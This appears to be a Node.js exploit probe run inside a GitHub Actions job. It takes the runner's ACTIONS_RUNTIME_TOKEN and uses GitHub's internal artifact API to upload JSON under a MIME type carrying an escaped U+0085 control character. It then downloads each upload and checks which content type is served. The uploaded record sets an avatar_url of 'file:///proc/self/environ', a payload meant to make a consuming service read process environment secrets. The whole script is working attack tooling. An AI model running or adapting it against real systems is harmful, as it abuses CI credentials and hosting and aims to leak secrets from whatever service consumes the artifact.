import { createHash } from 'node:crypto';
import https from 'node:https';

const service = 'github.actions.results.api.v1.ArtifactService';
const repo = process.env.GITHUB_REPOSITORY;
const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'));
const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
const [, runId, jobId] = scope.split(':');
const mime = 'application/json\\u0085';

async function rpc(method, payload) {
  const response = await fetch(new URL(`/twirp/${service}/${method}`, base), {
    method: 'POST',
    headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
    body: JSON.stringify(payload),
  });
  const text = await response.text();
  if (!response.ok) throw new Error(`HTTP ${response.status}: ${text.slice(0, 220)}`);
  return JSON.parse(text);
}

function putBlob(url, data) {
  const target = new URL(url);
  return new Promise((resolve, reject) => {
    const req = https.request({
      method: 'PUT',
      hostname: target.hostname,
      port: target.port || 443,
      path: target.pathname + target.search,
      headers: {
        'content-type': 'application/octet-stream',
        'content-length': String(data.length),
        'x-ms-blob-type': 'BlockBlob',
        'x-ms-blob-content-type': mime,
        'x-ms-version': '2022-11-02',
      },
    }, response => {
      response.resume();
      response.on('end', () => {
        if (response.statusCode < 200 || response.statusCode >= 300) {
          reject(new Error(`upload HTTP ${response.statusCode}`));
        } else resolve(response.statusCode);
      });
    });
    req.on('error', reject);
    req.end(data);
  });
}

for (const version of [2, 3, 4, 5]) {
  const name = `repo-cassette-version-${version}-${process.env.GITHUB_RUN_ID}.json`;
  const create = {
    workflow_run_backend_id: runId,
    workflow_job_run_backend_id: jobId,
    name,
    version,
    mime_type: mime,
  };
  let created;
  try {
    created = await rpc('CreateArtifact', create);
  } catch (error) {
    console.log(`VERSION_PROBE ${JSON.stringify({version, phase:'create', error:error.message})}`);
    continue;
  }
  const uploadUrl = created.signed_upload_url || created.signedUploadUrl;
  if (!created.ok || !uploadUrl) {
    console.log(`VERSION_PROBE ${JSON.stringify({version, phase:'create', error:'no signed upload URL'})}`);
    continue;
  }
  try {
    const placeholder = Buffer.from(JSON.stringify({
      full_name: `${repo}/actions/artifacts/pending/zip`,
      owner: {login:'cassette', avatar_url:'file:///proc/self/environ'},
      description:'Repo Cassette version MIME probe',
      stargazers_count:0,
    }));
    await putBlob(uploadUrl, placeholder);
    const digest = createHash('sha256').update(placeholder).digest('hex');
    const finalized = await rpc('FinalizeArtifact', {
      workflow_run_backend_id: runId,
      workflow_job_run_backend_id: jobId,
      name,
      size: String(placeholder.length),
      hash: `sha256:${digest}`,
    });
    const id = String(finalized.artifact_id || finalized.artifactId);
    if (!finalized.ok || !id) throw new Error('finalize returned no artifact ID');
    const body = Buffer.from(JSON.stringify({
      full_name: `${repo}/actions/artifacts/${id}/zip`,
      owner: {login:'cassette', avatar_url:'file:///proc/self/environ'},
      description:'Repo Cassette version MIME probe',
      stargazers_count:0,
    }));
    await putBlob(uploadUrl, body);
    const signed = await rpc('GetSignedArtifactURL', {
      workflow_run_backend_id: runId,
      workflow_job_run_backend_id: jobId,
      name,
    });
    const signedUrl = signed.signed_url || signed.signedUrl;
    if (!signedUrl) throw new Error('no signed download URL');
    const response = await fetch(signedUrl);
    const bytes = Buffer.from(await response.arrayBuffer());
    const contentType = response.headers.get('content-type') || '';
    console.log(`VERSION_PROBE ${JSON.stringify({
      version, phase:'download', id, status:response.status,
      contentType, contentTypeCodepoints:Array.from(contentType,c=>c.codePointAt(0).toString(16)),
      bytes:bytes.length, bodyMatch:bytes.equals(body),
      sha256:createHash('sha256').update(bytes).digest('hex'),
    })}`);
  } catch (error) {
    console.log(`VERSION_PROBE ${JSON.stringify({version, phase:'upload/finalize/download', error:error.message})}`);
  }
}
